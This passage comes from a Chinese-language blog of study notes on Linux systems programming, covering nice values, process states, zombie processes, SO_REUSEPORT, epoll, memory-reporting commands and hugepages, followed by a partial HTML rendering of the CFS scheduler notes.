process may have different nice values. \n   > - The range of the nice value varies across UNIX systems. **On modern Linux, the range is -20 (high priority) to +19 (low priority)**. On some other systems, the range is -20..20. Very early Linux kernels (Before Linux 2.0) had the range -infinity..15. \n   > - The degree to which the nice value affects the relative scheduling of SCHED_OTHER processes likewise varies across UNIX systems and across Linux kernel versions. \n   > - With the advent of the **CFS scheduler** in kernel 2.6.23, Linux adopted an algorithm that **causes relative differences in nice values to have a much stronger effect**. \n   > - **In the current implementation, each unit of difference in the nice values of two processes results in a factor of 1.25 in the degree to which the scheduler favors the higher priority process.** This causes very low nice values (+19) to truly provide little CPU to a process whenever there is any other higher priority load on the system, and makes high nice values (-20) deliver most of the CPU to applications that require it (e.g., some audio applications). \n   > - On Linux, the RLIMIT_NICE resource limit can be used to define a limit to which an unprivileged process's nice value can be raised; see setrlimit(2) for details. \n   > - Traditionally, only a privileged process could lower the nice value (i.e., set a higher priority). However, since Linux 2.6.12, an unprivileged process can decrease the nice value of a target process that has a suitable RLIMIT_NICE soft limit; see getrlimit(2) for details.\n\n### 进程状态\n\n- 来自*linux内核设计与实现*\n- `TASK_RUNNING`：进程是可执行的，可能正在执行，或在运行队列中等待执行。这是进程在用户空间中执行的唯一可能状态。内核空间中正在执行的进程也是这种状态\n- `TASK_INTERRUPTIBLE`：进程正在睡眠（也就是被阻塞），到达某些条件达成，一旦条件达成，内核就会把进程状态设置为RUNNING。处于此状态的进程会因为接收到信号而提前被唤醒并随时准备投入运行\n- `TASK_UNINTERRUPTIBLE`：与`TASK_INTERRUPTIBLE`的差别在于，就算接受到信号也不会被唤醒或准备投入运行。通常在进程必须在等待时不受干扰或等待的事件很快就会发生时出现（比如这个任务正在进行重要的操作，甚至可能持有一个信号量）。因为不对信号做响应，所以较之可中断的状态，用的较少。（ps中看到的`D`状态的进程就是这种状态）\n- `__TASK_TRACED`：被其他进程跟踪的进程，比如通过ptrace对调试程序进行跟踪\n- `__TASK_STOPPED`：进程停止执行，没有投入运行也不能投入运行。发生在接受到`SIGSTOP`，`SIGTSTP`，`SIGTTIN`，`SIGTTOU`信号时，调试期间受到任何信号也会使得进程进入这状态\n- 转换图见书P24(41)\n- Ref: ps manual\n   ```\n   the state of a process:\n           D    uninterruptible sleep (usually IO)\n           I    Idle kernel thread\n           R    running or runnable (on run queue)\n           S    interruptible sleep (waiting for an event to complete)\n           T    stopped by job control signal\n           t    stopped by debugger during the tracing\n           W    paging (not valid since the 2.6.xx kernel)\n           X    dead (should never be seen)\n           Z    defunct (\"zombie\") process, terminated but not reaped by its parent\n    ```\n\n### 僵尸进程、孤儿进程\n\n- 子进程的父进程终止后，成为孤儿进程，init（pid为1，所有进程的祖先）会接管孤儿进程，所以判断父进程是否终止的方法可以是检查getppid是否返回`1`（前提是这个子进程原本的父进程不是init）\n- 系统允许父进程在子进程终止后还去执行`wait`，以确定子进程是如何终止的。这是通过把子进程转为僵尸进程来处理的，僵尸进程释放了该该进程持有的大部分资源，唯一保留的是内核中的进程表中的一条记录（包含pid、终止状态、资源使用数据等）。僵尸进程无法被`SIGKILL`杀死（SIGKILL、SIGSTOP信号无法被捕获和忽略）\n- 父进程调用`wait`之后，内核将删除僵尸进程，如果父进程没有执行`wait`就退出，init将接管子进程并自动调用`wait`\n- 如果父进程没有退出，而又没有`wait`子进程，那么就可能导致僵尸进程填满内核进程表，从而阻碍新进程的创建。将他们移除的唯一方法是：杀死父进程（或是等待父进程终止）从而init会`wait`\n- 父进程`wait`的方式\n   - 父进程不带`WNOHANG`标志调用`wait`\n   - 父进程带有`WNOHANG`标志轮询\n   - 为SIGCHILD建立handler（默认是忽略）。需要在handler内部带`WNOHANG`不断调用`wait`以避免两个问题：调用信号Handler时，会阻塞引发该handler的信号；同一个信号不排队\n   - 应该在创建任何子进程之前就设置好Handler，因为在设置Handler时，如果已有子进程终止，那么有的系统会立刻产生SIGCHILD信号，有的不会\n\n### MISC\n\n- 识别僵尸进程` ps -ef | grep \"defunct\"`\n\n\n### `SO_REUSEPORT`\n\n> [引用自](https://lwn.net/Articles/542629/)\n> - The new socket option allows multiple sockets on the same host to bind to the same port, and is intended to improve the performance of multithreaded network server applications running on top of multicore systems.\n> - So long as the first server sets this option before binding its socket, then any number of other servers can also bind to the same port if they also set the option beforehand\n> -  The requirement that the first server must specify this option prevents port hijacking—the possibility that a rogue application binds to a port already used by an existing server in order to capture (some of) its incoming connections or datagrams.\n> - To prevent unwanted processes from hijacking a port that has already been bound by a server using SO_REUSEPORT, all of the servers that later bind to that port must have an effective user ID that matches the effective user ID used to perform the first bind on the socket. \n> - The second of the traditional approaches used by multithreaded servers operating on a single port is to have all of the threads (or processes) perform an accept() call on a single listening socket in a simple event loop of the form:\n>   ```c\n>    while (1) {\n>        new_fd = accept(...);\n>        process_connection(new_fd);\n>    }\n>   ```\n>   The problem with this technique, as Tom pointed out, is that when multiple threads are waiting in the accept() call, wake-ups are not fair, so that, under high load, incoming connections may be distributed across threads in a very unbalanced fashion\n> - the SO_REUSEPORT implementation distributes connections evenly across all of the threads (or processes) that are blocked in accept() on the same port.\n> - SO_REUSEPORT can be used with both TCP and UDP sockets.\n> - Tom noted that the traditional SO_REUSEADDR socket option already allows multiple UDP sockets to be bound to, and accept datagrams on, the same UDP port. However, by contrast with SO_REUSEPORT, SO_REUSEADDR does not prevent port hijacking and does not distribute datagrams evenly across the receiving threads.\n\n### `PTHREAD_STACK_MIN`\n\n> Ref: [Setting the Stack Size](https://docs.oracle.com/cd/E19120-01/open.solaris/816-5137/attrib-45427/index.html)\n> - The size attribute defines the size of the stack (in bytes) that the system allocates. The size should not be less than the system-defined minimum stack size. See About Stacks for more information.\n> - size contains the number of bytes for the stack that the new thread uses. If size is zero, a default size is used. In most cases, a zero value works best.\n> -PTHREAD_STACK_MIN is **the amount of stack space that is required to start a thread**. This stack space does not take into consideration the threads routine requirements that are needed to execute application code.\n\n### IO\n\n- 慢速syscall被信号中断时，已经read、write部分数据的syscall的处理：POSIX2001版是规定为成功返回，返回已read、write的字节数\n- POSIX.1要求只有中断信号的`SA_RESTART`标志有效时，才重启。不同厂商的处理方式不同\n\n### 网络编程\n\n- 因特网的socket地址存放在`sockaddr_in`的struct中\n- connect、bind、accept函数需要接受各种类型的socket地址结构（不仅仅是因特网socket），所以其要求大家都强转成`socketaddr`给他\n- socket函数才能一个socketFD，可以硬编码`socket(AF_INET, SOCK_STREAM, 0)`，其返回的fd仅仅是部分打开，还不能用于读写\n- 客户端使用connect函数来完成三次握手\n- `socket()`：返回一个socketFd，这是一个主动套接字\n- `bind()`\n   - 把一个本地协议地址赋予一个socket，对于ip协议，就是32bit的ipv4地址或128bit的ipv6地址与16bit的tcp或udp端口号的组合\n   - 调用bind时，可以指定一个端口号和（或）一个ip地址，也可以都不指定\n- `listen()`：把`socket()`创建的主动套接字转为监听套接字\n\n#### epoll\n\n- epoll支持水平触发和边缘触发\n\n  - 水平触发：能在FD上以非阻塞的方式执行I/O操作（poll、select提供的也是这个）\n  - 边缘触发\n    - 自从上一次调用`epoll_wait`后FD上是否已经有I/O活动（或者是FD被打开，如果之前没有调用的话），语义上类似信号驱动I/O，如果有多个I/O事件发生，epoll会把他们合并成一次单独的通知（信号驱动上可能会产生多个信号）\n    - 可以减少syscall的次数（我猜？）\n    - 程序基本框架如下\n      - 所有待监视的FD都设置为非阻塞\n      - 通过`epoll_ctl`建立epoll interest list\n      - 使用如下循环处理IO事件\n        - 用`epoll_wait`取得ready的FD list\n        - 针对每一个处于ready的FD，不断调用IO syscall，直到返回`EAGAIN`或`EWOULDBLOCK`\n      - 解决饥饿的方法\n        - 应用程序自己维护一个list，该list存储到目前为止的所有ready FD（如果某个FD返回`EAGAIN`或`EWOULDBLOCK`，则移出去）\n        - 每次都调用`epoll_wait`去监视并添加ready FD到list中。如果list中已经有FD，则这次监视的timeout（应该指的是`epoll_wait`的timeout参数）应该为0或较小的正数。这样子就不用在`epoll_wait`上花太多时间，可以进行IO\n        - 对于list上的FD，可以使用round-robin方式去循环处理，而不是每次从`epoll_wait`返回后都从list头开始处理\n        - 相对之下，使用水平触发时，因为我们只是在ready 的FD上做一些IO而已（不是循环到不能读为止），所以不会有饥饿问题。（英文原文说的是blocking 的FD，译文说的是非阻塞，我觉得也是非阻塞比较合适，因为如果阻塞那么一旦没东西读了，会不会阻塞在那里呢？还是说只要读了一点东西，然后接下来不能读，就立刻可以返回）\n- 核心数据结构称为epoll实例，与epoll_fd关联，是内核数据结构的句柄。这些内核数据结构实现了两个目的\n\n  - interest list\n  - ready list（前者的子集）\n\n- `epoll_create`：创建epoll实例，size参数已废弃。`epoll_create1`去掉了该参数并且可设置flags，目前只支持`EPOLL_CLOEXEC`\n\n  > close-on-exec\n  > which causes the file descriptor to be  automatically (and atomically) closed when any of the exec-family functions succeed.\n  > This is useful to keep from leaking your file descriptors to random programs run by e.g. `system()`.\n\n- `epoll_ctl`\n\n  - fd参数（第三个参数）可以是pipe、FIFO、socket、POSIX消息队列、inotify实例、终端、设备、另一个epoll实例的fd（可以用于建立层次关系），不能是普通文件或目录的FD（EPERM）\n  - In a multithreaded program, it is possible for one thread to use `epoll_ctl` to add file descriptors to the interest list of an epoll instance that is already being monitored by epoll_wait() in another thread. These changes to the interest list will be taken into account immediately, and the epoll_wait() call will return readiness information about the newly added file descriptors. \n\n- `EPOLLONESHOT`：在下一次epoll_wait返回该FD后，该FD在兴趣列表中被标记为非激活状态，可以用`EPOLL_CTL_MOD`重新激活\n\n- `max_user_watcher`：每个注册到epoll实例上的FD都会占用一小段不能被交换的内核内存空间。这个参数用于定义可以注册到epoll实例上的FD总数。`/proc/sys/fs/epoll/max_user_watches`\n\n- `epoll_wait`\n\n  - 返回后，需要检查`EINTR`，如果在执行期间被一个信号打断，然后又通过SIGCONT信号恢复，就可能出现这个错误\n\n  - `EPOLLHUP`\n\n    >  Note that when reading from a channel such as a pipe or a stream socket, this event merely indicates that the peer  closed  its  end  of  the channel.  Subsequent reads from the channel will return 0 (end of file) **only after all outstanding data in the channel has been consumed.**\n    >\n    > ```c\n    > if(evlist[j].events & EPOLLIN) {\n    >     // do read\n    > }else if(evlist[j].events & (EPOLLHUP | EPOLLERR)) {\n    >     // close fd \n    > }\n    > //  After the epoll_wait(), EPOLLIN and EPOLLHUP may both have been set. But we'll only get here, and thus close the file descriptor, if EPOLLIN was not set. This ensures that all outstanding input (possibly more than MAX_BUF bytes) is consumed (by further loop iterations) before the file descriptor is closed.\n    > ```\n  - `EPOLLHUP`和`EPOLLERR`会出现在FIFO对端关闭或终端挂起时出现\n- epoll的语义\n  - 创建epoll实例时，内核在内存中创建一个新的i-node并打开**文件描述**（file descriptor：一个打开的文件的上下文信息，内核的数据结构）\n  - 随后在调用进程中为打开的这个文件描述分配一个新的**文件描述符**（这就是用户空间的应用程序操作这个file descriptor的句柄）\n  - 同epoll实例的insterest list相关联的是打开的**文件描述**，而不是**文件描述符**。所以可以使用dup复制该描述符，fork也可以，因为子进程复制了父进程的epoll描述符。复制后的描述符指向相同的**文件描述**\n  - 如果一个**文件描述**是epoll insterest list的成员，那么在这个**文件描述**的所有描述符都关闭后，这个**文件描述**会自动从epoll 的interest list中移除\n  - 所以如果某个fd A被复制（复制的那一个叫fd B），然后关闭该fd A，但是epoll_wait还是会在该**文件描述**就绪后返回fd A\n- epoll vs select vs poll\n  - 每次调用select、poll，内核必须检查所有在调用中指定的FD。epoll只需要在FD就绪时将其加入ready list，然后`epoll_wait`去fetch这些FD就行\n  - 调用select、poll时，我们传递一个标记了所有待监视的FD的数据结构给内核，返回时，内核将所有标记为ready的FD的数据结构在传给我们。epoll则使用`epoll_ctl`在内核空间建立数据结构，之后的`epoll_wait`不需要传递数据结构，返回的也只是ready的FD\n  - epoll的性能会随着发生I/O事件的数量而线性变化，所以适用于需要监视大量FD但是大部分处于空闲状态\n- epoll与信号\n   - `epoll_wait`的过程中是会因为SIGINT而返回，errno为EINTR的\n   - 如果使用了信号，应该使用`epoll_pwait`来避免race condition\n- > - 值得一提的时，epoll的效率在某些情况下比select或者poll要低，这个是曾经做过测试的。具体的业务场景就是：几乎所有连接都处于活跃状态，并且有频繁的业务数据发送和接受，这个时候select或者poll的能力要强于epoll。下面贴一张比较久远的测试数据表格，可以看到这个现象。一个用select实现的echo server，传输的数据量是52B一次的小报文。 ([Ref](http://zbo.space/2016/05/24/netio/))\n  > - select\n  >\n  >    |连接数量|cpu(%)|一次回射平均延时(μs)|\n  >    |:-:|:-:|:-:|\n  >    |100|94.5|1394|\n  >    |500|95|9507|\n  >    |1000|95|19852|\n  >- epoll\n  >\n  >    |连接数量|cpu(%)|一次回射平均延时(μs)|\n  >    |:-:|:-:|:-:|\n  >    |100|93|1930|\n  >    |500|93|11120|\n  >    |1000|95|23857|\n  > - (或许是因为使用了中断，所以不如轮询快？另外，select是数组，epoll应该是链表（？）所以cache miss高？不过听说kqueue可以合并中断，还可以把中断改成轮询)\n  > - 原理其它答案讲得差不多了，我就补一句，从kernel层面将，事件产生有可能不是由硬件中断触发的，在一定情况下kernel的确会轮询，因为响应硬件中断是一个成本比较高的操作。以网卡为例，当数据量很少的时候，每来一个数据包网卡都回产生一个中断，kernel响应这个中断，从网卡缓冲区中读出数据放进协议栈处理，当满足一定条件时，kernel回调用户代码，这里的“回调”一般情况下是指从一个kernel syscall中返回(在此之前用户代码一直处于block状态)。当数据量很大时，每个包都产生一个中断就划不来了，此时kernel可以启动interrupt coalescing机制，让网卡做中断合并，也就是说来足够多的数据包或者等待一个timeout才会产生一个中断，kernel在响应中断时会把所有数据一起读出来处理，这样可以有效的降低中断次数。当数据量更大时，网卡缓冲区里几乎总是有未处理的数据，此时kernel干脆会禁掉网卡的中断，切换到轮询处理的模式，说白了就是跑一个忙循环不停地读网卡缓冲区里的数据，这样综合开销更低。\n  > 作者：徐辰\n  > 链接：https://www.zhihu.com/question/20122137/answer/54153089\n  > 来源：知乎\n  > 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\n\n### 惊群\n\n- > 很多个进程都block在server socket的accept()，一但有客户端进来，所有进程的accept()都会返回，但是只有一个进程会读到数据，就是惊群。实际上现在的Linux内核实现中不会出现惊群了，只会有一个进程被唤醒（Linux2.6内核）([ref](https://www.zhihu.com/question/22756773/answer/22516222))\n- > 为了确保只有一个进程（线程）得到资源，需要对资源操作进行加锁保护，加大了系统的开销。目前一些常见的服务器软件有的是通过锁机制解决的，比如 Nginx\n- [什么是惊群，如何有效避免惊群? - 滴滴云的回答 - 知乎](https://www.zhihu.com/question/22756773/answer/545048210)\n\n### 命令\n\n#### top\n\n- [Ref](http://ilinuxkernel.com/?p=869)。影响load average值大小的直接因素是系统中活动的进程数。Linux的系统负载指运行队列的平均长度，也就是等待CPU的平均进程数。活动的进程数可以很直观表明系统负载情况。值越大，表明CPU上正在运行和待运行的进程数越多，也就是负载越大。查看loadAvg的方法：top、uptime、w、cat /proc/loadavg，是一分钟、五分钟、十五分钟\n- top的manual\n   ```\n    2b. TASK and CPU States\n       This  portion  consists of a minimum of two lines.  In an SMP environ‐\n       ment, additional lines can reflect individual CPU state percentages.\n\n       Line 1 shows total tasks or threads, depending on  the  state  of  the\n       Threads-mode toggle.  That total is further classified as:\n           running; sleeping; stopped; zombie\n\n       Line  2  shows  CPU  state percentages based on the interval since the\n       last refresh.\n\n       As a default, percentages for these  individual  categories  are  dis‐\n       played.   Where two labels are shown below, those for more recent ker‐\n       nel versions are shown first.\n           us, user    : time running un-niced user processes\n           sy, system  : time running kernel processes\n           ni, nice    : time running niced user processes\n           id, idle    : time spent in the kernel idle handler\n           wa, IO-wait : time waiting for I/O completion\n           hi : time spent servicing hardware interrupts\n           si : time spent servicing software interrupts\n           st : time stolen from this vm by the hypervisor\n\n       In  the  alternate  cpu  states  display  modes,  beyond   the   first\n       tasks/threads  line,  an  abbreviated  summary  is shown consisting of\n       these elements（就是按了`t`键之后显示的内容）:\n                      a    b     c    d\n           %Cpu(s):  75.0/25.0  100[ ...\n\n       Where: a) is the combined us and ni percentage; b) is the sy  percent‐\n       age; c) is the total; and d) is one of two visual graphs of those rep‐\n       resentations.  See topic 4b. SUMMARY AREA Commands and the `t' command\n       for additional information on that special 4-way toggle.\n\n   2c. MEMORY Usage\n       This  portion  consists  of  two  lines  which  may  express values in\n       kibibytes (KiB) through exbibytes (EiB) depending on the scaling  fac‐\n       tor enforced with the `E' interactive command.\n\n       As a default, Line 1 reflects physical memory, classified as:\n           total, free, used and buff/cache\n\n       Line 2 reflects mostly virtual memory, classified as:\n           total, free, used and avail (which is physical memory)\n\n       The  avail number on line 2 is an estimation of physical memory avail‐\n       able for starting new applications, without swapping.  Unlike the free\n       field,  it  attempts to account for readily reclaimable page cache and\n       memory slabs.  It is available on kernels 3.14,  emulated  on  kernels\n       2.6.27+, otherwise the same as free.\n\n       In  the  alternate memory display modes, two abbreviated summary lines\n       are shown consisting of these elements:\n                      a    b          c\n           GiB Mem : 18.7/15.738   [ ...\n           GiB Swap:  0.0/7.999    [ ...\n\n       Where: a) is the percentage used; b) is the total available; and c) is\n       one of two visual graphs of those representations.\n\n       In  the  case  of physical memory, the percentage represents the total\n       minus the estimated avail noted above.   The  `Mem'  graph  itself  is\n       divided  between used and any remaining memory not otherwise accounted\n       for by avail.  See topic 4b. SUMMARY AREA Commands and the `m' command\n       for additional information on that special 4-way toggle.\n\n       This table may help in interpreting the scaled values displayed:\n           KiB = kibibyte = 1024 bytes\n           MiB = mebibyte = 1024 KiB = 1,048,576 bytes\n           GiB = gibibyte = 1024 MiB = 1,073,741,824 bytes\n           TiB = tebibyte = 1024 GiB = 1,099,511,627,776 bytes\n           PiB = pebibyte = 1024 TiB = 1,125,899,906,842,624 bytes\n           EiB = exbibyte = 1024 PiB = 1,152,921,504,606,846,976 bytes\n   ```\n\n#### free\n   ```\n       free  displays the total amount of free and used physical and swap memory\n       in the system, as well as the buffers and caches used by the kernel.  The\n       information  is  gathered by parsing /proc/meminfo. The displayed columns\n       are:\n\n       total  Total installed memory (MemTotal and SwapTotal in /proc/meminfo)\n\n       used   Used memory (calculated as total - free - buffers - cache)\n\n       free   Unused memory (MemFree and SwapFree in /proc/meminfo)\n\n       shared Memory used (mostly) by tmpfs (Shmem in /proc/meminfo)\n\n       buffers\n              Memory used by kernel buffers (Buffers in /proc/meminfo)\n\n       cache  Memory used by the page cache and slabs (Cached  and  SReclaimable\n              in /proc/meminfo)\n\n       buff/cache\n              Sum of buffers and cache\n\n       available\n              Estimation of how much memory is available for starting new appli‐\n              cations, without swapping. Unlike the data provided by  the  cache\n              or  free fields, this field takes into account page cache and also\n              that not all reclaimable memory slabs will  be  reclaimed  due  to\n              items  being  in  use (MemAvailable in /proc/meminfo, available on\n              kernels 3.14, emulated on kernels 2.6.27+, otherwise the  same  as\n              free)\n   ```\n- Buffers vs Cached([Ref](https://access.redhat.com/solutions/406773#diag), [Ref](https://www.kernel.org/doc/Documentation/filesystems/proc.txt))\n   - Buffers: Memory in buffer cache, so relatively temporary storage for raw disk blocks. This shouldn't get very large.\n   - Cached: Memory in the pagecache (Diskcache and Shared Memory)\n   ```\n      Buffers: Relatively temporary storage for raw disk blocks\n              shouldn't get tremendously large (20MB or so)\n      Cached: in-memory cache for files read from the disk (the\n              pagecache).  Doesn't include SwapCached\n  SwapCached: Memory that once was swapped out, is swapped back in but\n              still also is in the swapfile (if memory is needed it\n              doesn't need to be swapped out AGAIN because it is already\n              in the swapfile. This saves I/O)\n   ```\n\n#### vmstat\n   ```\n   FIELD DESCRIPTION FOR VM MODE\n      Procs\n          r: The number of runnable processes (running or waiting for run time).\n          b: The number of processes in uninterruptible sleep.\n   \n      Memory\n          swpd: the amount of virtual memory used.\n          free: the amount of idle memory.\n          buff: the amount of memory used as buffers.\n          cache: the amount of memory used as cache.\n          inact: the amount of inactive memory.  (-a option)\n          active: the amount of active memory.  (-a option)\n   \n      Swap\n          si: Amount of memory swapped in from disk (/s).\n          so: Amount of memory swapped to disk (/s).\n   \n      IO\n          bi: Blocks received from a block device (blocks/s).\n          bo: Blocks sent to a block device (blocks/s).\n   \n      System\n          in: The number of interrupts per second, including the clock.\n          cs: The number of context switches per second.\n   \n      CPU\n          These are percentages of total CPU time.\n          us: Time spent running non-kernel code.  (user time, including nice time)\n          sy: Time spent running kernel code.  (system time)\n          id: Time spent idle.  Prior to Linux 2.5.41, this includes IO-wait time.\n          wa: Time spent waiting for IO.  Prior to Linux 2.5.41, included in idle.\n          st: Time stolen from a virtual machine.  Prior to Linux 2.6.11, unknown.\n   ```\n- buff vs cache\n   > [tldp-buffer-cache](http://tldp.org/LDP/sag/html/buffer-cache.html)\n   > - By reading the information from disk only once and then keeping it in memory until no longer needed, one can speed up all but the first read. This is called disk buffering, and the memory used for the purpose is called the buffer cache.\n   > - To make the most efficient use of real memory, Linux automatically uses all free RAM for buffer cache, but also automatically makes the cache smaller when programs need more memory. Under Linux, you do not need to do anything to make use of the cache, it\n\n\n### HugePage\n\n- 好处\n   - 增加TLB命中率\n   - 减小页表大小\n   - 如果可以把多级页表的级数减少，则可以减小查页表时间\n- 缺点\n   - 有一些需要页对齐的场景那么为了对齐浪费的空间就比较多\n   - 页表提供的内存保护是以页为单位的\n   - 缺页时需要调入的东西增加\n   - 共享内存时需要共享整数个页那么大的块（我认为如此，因为是通过在页表中填入相同的物理页地址来共享内存的）\n   - Cache的命中率可能会降低，比如如果有的东西需要放在相邻的两个页上，那么4K页时，其实两个东西都可以缓存在L1，但是对于4M的页则不行\n      ```\n      Model name:          Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz\n      L1d cache:           32K\n      L1i cache:           32K\n      L2 cache:            256K\n      L3 cache:            8192K\n      ```\n   - 因为程序所占用的物理内存都需要在页表有记录，那么hugePage意味着小应用会占用更多内存\n   - mmap\n      > on Linux, the mapping will be created at a nearby page boundary.\n      > offset must be a multiple of the page size as returned by sysconf(_SC_PAGE_SIZE).\n- 其他影响\n  - 块（文件系统的一种抽象，文件系统的最小寻址单元，只能基于块来访问文件系统）不能比page大（This is an artificial constraint that could go away in the future），所以hugepage会使得块可以很大\n\n### malloc\n\n- 调用并分配1GB的内存，是否物理内存就会少1G？一方面，CopyOnWrite，所以如果没有写，是不会的。另一方面，空闲链表\n\n\n### MISC\n\n- 需要对目录有`x`权限才能cd进目录\n\n\n","content":"<h3 id=\"Linux调度\"><a href=\"#Linux调度\" class=\"headerlink\" title=\"Linux调度\"></a>Linux调度</h3><ul>\n<li>linux内核设计与实现第4章</li>\n<li>不同进程有不同的调度算法（这种模块化结构称为调度器类）。每个调度器都有一个优先级，不同调度器之间如何协调？拥有一个可执行进程的最高优先级的调度器会胜出，去选择接下来要执行那个进程（The highest priority scheduler class that has a runnable process wins, selecting who runs next.）</li>\n</ul>\n<h4 id=\"CFS\"><a href=\"#CFS\" class=\"headerlink\" title=\"CFS\"></a>CFS</h4><ul>\n<li>从Linux2.6.23开始引入</li>\n<li>针对普通进程的调度器类（Linux中称为<code>SCHED_NORMAL</code>，POSIX称为<code>SCHED_OTHER</code>）</li>\n<li>基于一个简单的理念：每个进程都能获得<code>1/n</code>的处理器时间（n是可运行的进程数量），任何可测量的周期内都是<code>1/n</code>（一个先运行5ms，另一个运行5ms是不满足这个理念的，要做到好像他们在10ms内同时运行，各自使用了一半的处理器能力）<blockquote>\n<ul>\n<li>Ref: <a href=\"https://www.cs.columbia.edu/~junfeng/13fa-w4118/lectures/l13-adv-sched.pdf\" target=\"_blank\" rel=\"noopener\">https://www.cs.columbia.edu/~junfeng/13fa-w4118/lectures/l13-adv-sched.pdf</a></li>\n<li>Approximate fair scheduling. Run each process once per schedule latency period(就是sched_latency_ns，用<code>sysctl -a</code>可以看到). Time slice for process Pi: <code>T * Wi/(Sum of all Wi)</code></li>\n<li>Too many processes? Lower bound on smallest time slice. Schedule latency = lower bound * number of procs</li>\n<li>Pick proc with weighted minimum runtime so far  <code>Virtual runtime: task-&gt;vruntime += executed time / Wi</code></li>\n<li>Red-black tree, Balanced binary search tree, Ordered by vruntime as key, O(lgN) insertion, deletion, update, O(1): find min(<code>min_vruntime</code> caches smallest value)</li>\n<li>Update <code>vruntime</code> and <code>min_vruntime</code>: When task is added or removed, On every timer tick, context switch</li>\n<li>Converting nice level to weight(): <code>static const int prio_to_weight[40] (sched.h)</code>, Nice level changes by 1-&gt;10% weight.(Pre-computed to avoid Floating point operations, Runtime overhead)(<strong>In the current implementation, each unit of difference in the nice values of two processes results in a factor of 1.25 in the degree to which the scheduler favors the higher priority process.</strong>, 来自sched和nice的的manual)<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;   <span class=\"comment\">// from https://elixir.bootlin.com/linux/v3.4/source/kernel/sched/sched.h#L804</span></span><br><span class=\"line\">&gt;   <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">&gt;    * Nice levels are multiplicative, with a gentle 10% change for every</span></span><br><span class=\"line\"><span class=\"comment\">&gt;    * nice level changed. I.e. when a CPU-bound task goes from nice 0 to</span></span><br><span class=\"line\"><span class=\"comment\">&gt;    * nice 1, it will get ~10% less CPU time than another CPU-bound task</span></span><br><span class=\"line\"><span class=\"comment\">&gt;    * that remained on nice 0.</span></span><br><span class=\"line\"><span class=\"comment\">&gt;    *</span></span><br><span class=\"line\"><span class=\"comment\">&gt;    * The \"10% effect\" is relative and cumulative: from _any_ nice level,</span></span><br><span class=\"line\"><span class=\"comment\">&gt;    * if you go up 1 level, it's -10% CPU usage, if you go down 1 level</span></span><br><span class=\"line\"><span class=\"comment\">&gt;    * it's +10% CPU usage. (to achieve that we use a multiplier of 1.25.</span></span><br><span class=\"line\"><span class=\"comment\">&gt;    * If a task goes up by ~10% and another task goes down by ~10% then</span></span><br><span class=\"line\"><span class=\"comment\">&gt;    * the relative distance between them is ~25%.)</span></span><br><span class=\"line\"><span class=\"comment\">&gt;    */</span></span><br><span class=\"line\">&gt;   <span class=\"keyword\">static</span> <span class=\"keyword\">const</span> <span class=\"keyword\">int</span> prio_to_weight[<span class=\"number\">40</span>] = &#123;</span><br><span class=\"line\">&gt;    <span class=\"comment\">/* -20 */</span>     <span class=\"number\">88761</span>,     <span class=\"number\">71755</span>,     <span class=\"number\">56483</span>,     <span class=\"number\">46273</span>,     <span class=\"number\">36291</span>,</span><br><span class=\"line\">&gt;    <span class=\"comment\">/* -15 */</span>     <span class=\"number\">29154</span>,     <span class=\"number\">23254</span>,     <span class=\"number\">18705</span>,     <span class=\"number\">14949</span>,     <span class=\"number\">11916</span>,</span><br><span class=\"line\">&gt;    <span class=\"comment\">/* -10 */</span>      <span class=\"number\">9548</span>,      <span class=\"number\">7620</span>,      <span class=\"number\">6100</span>,      <span class=\"number\">4904</span>,      <span class=\"number\">3906</span>,</span><br><span class=\"line\">&gt;    <span class=\"comment\">/*  -5 */</span>      <span class=\"number\">3121</span>,      <span class=\"number\">2501</span>,      <span class=\"number\">1991</span>,      <span class=\"number\">1586</span>,      <span class=\"number\">1277</span>,</span><br><span class=\"line\">&gt;    <span class=\"comment\">/*   0 */</span>      <span class=\"number\">1024</span>,       <span class=\"number\">820</span>,       <span class=\"number\">655</span>,       <span class=\"number\">526</span>,       <span class=\"number\">423</span>,</span><br><span class=\"line\">&gt;    <span class=\"comment\">/*   5 */</span>       <span class=\"number\">335</span>,       <span class=\"number\">272</span>,       <span class=\"number\">215</span>,       <span class=\"number\">172</span>,       <span class=\"number\">137</span>,</span><br><span class=\"line\">&gt;    <span class=\"comment\">/*  10 */</span>       <span class=\"number\">110</span>,        <span class=\"number\">87</span>,        <span class=\"number\">70</span>,        <span class=\"number\">56</span>,        <span class=\"number\">45</span>,</span><br><span class=\"line\">&gt;    <span class=\"comment\">/*  15 */</span>        <span class=\"number\">36</span>,        <span class=\"number\">29</span>,        <span class=\"number\">23</span>,        <span class=\"number\">18</span>,        <span class=\"number\">15</span>,</span><br><span class=\"line\">&gt;   &#125;;</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<ul>\n<li>Hierarchical, modular scheduler <figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;    <span class=\"class\"><span class=\"keyword\">class</span> = <span class=\"title\">sched_class_highest</span>;</span></span><br><span class=\"line\">&gt;    <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">&gt;        p = class-&gt;pick_next_task(rq);</span><br><span class=\"line\">&gt;        <span class=\"keyword\">if</span> (p)</span><br><span class=\"line\">&gt;            <span class=\"keyword\">return</span> p;</span><br><span 